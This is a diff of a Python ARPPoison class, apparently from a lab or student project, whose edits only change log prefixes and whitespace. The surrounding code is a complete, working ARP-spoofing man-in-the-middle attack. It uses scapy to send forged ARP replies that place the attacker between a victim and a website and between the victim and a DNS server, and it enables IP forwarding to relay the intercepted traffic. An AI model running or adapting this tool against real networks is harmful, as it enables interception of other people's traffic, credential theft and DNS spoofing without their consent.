@@ -14,17 +14,17 @@ class ARPPoison:
 
         # TODO This is for testing purposes only
         self.set_dns("172.18.0.40")
-    
+
     def get_mac(self, IP):
         try:
             broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP)
             pkt = scapy.srp(broadcast, iface=self.iface, timeout=2)[0]
             mac = pkt[0][1].hwsrc
         except IndexError:
-            print("> Could not find victim IP or interface. Exiting...")
+            print("[ARPPoison]: Could not find victim IP or interface. Exiting...")
             exit(1)
         return mac
-    
+
     def set_mac(self):
         self.victimMAC = self.get_mac(self.victimIP)
         self.websiteMAC = self.get_mac(self.websiteIP)
@@ -33,28 +33,28 @@ class ARPPoison:
         if self.dnsIP is None:
             self.dnsIP = dnsIP
             self.dnsMAC = self.get_mac(dnsIP)
-            print(f"> DNS server discovered: {dnsIP}")
-    
+            print(f"[ARPPoison]: DNS server discovered at {dnsIP}")
+
     def poison(self, target, pretend, MAC):
         # Note: Ignore warning when running, adding Ether 'hwdst' will break the poisoning
         packet = scapy.ARP(op=2, hwdst=MAC, pdst=target, psrc=pretend)
         scapy.send(packet, iface=self.iface)
-        print(f"> Poisoning {target} as {pretend}")
+        print(f"[ARPPoison]: Poisoning {target} as {pretend}")
 
     def ip_forward(self, enable):
         if enable:
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            print("> IP forwarding enabled.\n")
+            print("[ARPPoison]: IP forwarding enabled.\n")
         else:
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-            print("> IP forwarding disabled.")
-    
+            print("[ARPPoison]: IP forwarding disabled.")
+
     def restore_tables(self, ptarget1, ptarget2, hwt1, hwt2):
         pkt = scapy.ARP(op=2, pdst=ptarget1, hwdst=hwt1, psrc=ptarget2, hwsrc=hwt2)
         scapy.send(pkt, iface=self.iface)
         pkt = scapy.ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
         scapy.send(pkt, iface=self.iface)
-        
+
     def attack(self, timer, stop_event):
         self.set_mac()
         self.ip_forward(True)
@@ -63,12 +63,12 @@ class ARPPoison:
                 # Victim <--- Attacker ---> Website
                 self.poison(self.victimIP, self.websiteIP, self.victimMAC)
                 self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
-                
+
                 # Victim <--- Attacker ---> DNS Server (if discovered)
                 if self.dnsIP and self.dnsMAC:
                     self.poison(self.victimIP, self.dnsIP, self.victimMAC)
                     self.poison(self.dnsIP, self.victimIP, self.dnsMAC)
 
                 time.sleep(10.5 - timer)
-            
+
         self.ip_forward(False)
